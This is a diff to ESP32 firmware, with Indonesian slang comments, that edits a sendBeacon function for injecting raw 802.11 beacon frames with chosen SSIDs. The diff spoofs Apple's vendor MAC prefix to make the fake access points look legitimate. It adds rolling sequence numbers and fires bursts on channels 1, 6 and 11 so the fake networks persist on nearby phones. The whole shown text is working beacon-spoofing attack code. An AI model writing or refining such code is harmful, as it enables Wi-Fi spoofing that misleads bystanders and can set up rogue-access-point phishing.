@@ -246,51 +246,60 @@ void track_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 }
 
+// Array bawaan lu tetep sama
+
 
 void sendBeacon(const char* ssid) {
     int ssidLen = strlen(ssid);
     
-    // 1. Acak MAC Address (BSSID & Source MAC)
-    for(int i = 10; i < 16; i++) {
+    // TAMBAHAN: Bikin Sequence Number yang jalan terus
+    static uint16_t seq = 0;
+    seq++;
+    if (seq > 4095) seq = 0; // Mentok di 12-bit
+
+    // 1. MAC Address Legit (Pake OUI Vendor Asli)
+    // 3 Byte awal kita fix misal OUI Apple: 00:25:00
+    beaconPacket[10] = 0x00; beaconPacket[11] = 0x25; beaconPacket[12] = 0x00;
+    beaconPacket[16] = 0x00; beaconPacket[17] = 0x25; beaconPacket[18] = 0x00;
+    
+    // Cukup Acak 3 Byte Terakhir (Device ID)
+    for(int i = 13; i < 16; i++) {
         uint8_t r = esp_random() % 256;
         beaconPacket[i] = r;      
         beaconPacket[i+6] = r;    
     }
 
-    // 2. Pasang Nama SSID ke Paket
+    // 2. Inject Sequence Number ke Byte 22 & 23
+    beaconPacket[22] = (seq << 4) & 0xFF; 
+    beaconPacket[23] = (seq >> 4) & 0xFF;
+
+    // 3. Pasang Nama SSID ke Paket
     beaconPacket[37] = ssidLen;
     for(int i = 0; i < ssidLen; i++) {
         beaconPacket[38+i] = ssid[i];
     }
 
-    // 3. Tambah Tail (Supported Rates + DS Parameter Set)
+    // 4. Tambah Tail
     uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
     memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));
 
-    // Cari posisi byte Channel di dalem payload (byte terakhir dari postSSID)
     int channelPos = 38 + ssidLen + 12;
 
-    // 4. TEMBAK PAKE WIFI_IF_STA
-    for (int ch = 1; ch <= 13; ch++) {
+    // 5. TEMBAK PAKE WIFI_IF_STA (Fokus di channel 1, 6, 11 aja biar gak gampang ilang)
+    uint8_t targetChannels[] = {1, 6, 11};
+    for (int i = 0; i < 3; i++) {
+        uint8_t ch = targetChannels[i];
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-        
-        // UPDATE byte channel di dalem paket biar HP gak nganggep ini invalid
         beaconPacket[channelPos] = ch;
 
-        // BURST TX: Tembak beberapa kali di channel yang sama
         for (int burst = 0; burst < 3; burst++) {
             esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
-            
-            // Delay microsecond biar antrean TX buffer ESP32 gak jebol/nabrak
-            // (Pakai esp_rom_delay_us atau delayMicroseconds tergantung framework)
-            esp_rom_delay_us(500);
-            
+            esp_rom_delay_us(500); 
         }
-        
-        // Kasih nafas RTOS pas pindah channel
         vTaskDelay(pdMS_TO_TICKS(1)); 
     }
 }
+
 
 
 // Taruh di atas sebelum fungsi loopWiFi()
